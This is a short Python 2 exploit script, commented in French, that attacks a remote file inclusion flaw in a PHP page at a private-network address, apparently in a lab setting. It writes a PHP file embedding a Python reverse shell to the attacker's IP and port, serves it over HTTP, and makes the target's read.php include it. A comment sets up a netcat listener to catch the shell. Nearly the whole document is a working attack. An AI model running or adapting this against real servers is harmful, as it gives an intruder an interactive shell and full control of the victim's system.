#encoding:utf-8
import requests,sys,os
# Exploitation de la faille RFI
#nc -lvp 12345 sur l'h√¥te distant
if len(sys.argv)!=3:
	print "Usage : python exploit_rfi.py <local IP> <local Port>"
	exit(1)

os.system("cd /tmp ; mkdir ws ; cd ws ; echo \"<?php system('"+"python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\""+sys.argv[1]+"\\\","+sys.argv[2]+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\'"+"'); ?>\" > exploit.txt ; python -m SimpleHTTPServer &")
requests.get("http://192.168.4.1/read.php",params={"file":"http://"+sys.argv[1]+":8000/exploit.txt"})
